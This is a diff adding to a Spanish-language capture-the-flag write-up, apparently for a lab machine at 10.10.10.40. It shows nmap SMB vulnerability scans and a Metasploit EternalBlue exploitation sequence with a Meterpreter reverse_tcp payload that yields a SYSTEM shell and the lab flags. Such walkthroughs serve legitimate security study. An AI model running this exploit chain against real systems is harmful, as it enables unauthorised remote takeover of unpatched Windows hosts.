@@ -133,3 +133,55 @@ nmap -p 445 --script smb-vuln* 10.10.10.40
 
 ![Pasted image 20250522163652.png](/img/user/Pasted%20image%2020250522163652.png)
 
+Algunos payloads extras:
+- nmap -p 445 --script smb-enum-shares,smb-enum-users,smb-vuln* ip (escaneo combinado completo de SMB)
+- nmap -p 445 --script smb-os-discovery,smb-protocols ip (verificar version de SMB y detalles del servidor)
+- sudo nmap --script-updatedb (asegurarnos de que nmap tenga los scripts habilitados)
+
+Una vez que hemos identificado la vulnerabilidad, usaremos msfconsole para explotarla.
+
+Iniciamos el msfconsole:
+
+- msfconsole
+
+Cargamos el exploit:
+
+- use exploit/windows/smb/ms17_010_eternalblue
+
+Verificamos las opciones:
+
+- show options
+
+Establecemos la IP del objetivo:
+
+- set RHOSTS 10.10.10.40
+
+Seleccionamos el payload (por ejemplo, Meterpreter):
+
+- set PAYLOAD windows/x64/meterpreter/reverse_tcp
+Si el sismte es de 32 bits, usa: windows/meterpreter/reverse_tcp
+
+En este casoo el payload que sirve es el de **x64**
+
+![Pasted image 20250522164803.png](/img/user/Pasted%20image%2020250522164803.png)
+
+Damos un **shell** en el meterpreter y tenemos nuestra consola de windows interactiva:
+
+![Pasted image 20250522165214.png](/img/user/Pasted%20image%2020250522165214.png)
+
+
+Para ver el usuario con el que se ejecuta el exploit usamos **whoami**: 
+
+- nt authority\system
+
+Para encontrar el user.txt nos vamos al usuario **haris**:
+
+- type user.txt
+
+![Pasted image 20250522165350.png](/img/user/Pasted%20image%2020250522165350.png)
+
+Al igual para el root nos vamos a **Administrator**:
+
+![Pasted image 20250522165441.png](/img/user/Pasted%20image%2020250522165441.png)
+
+thansk.
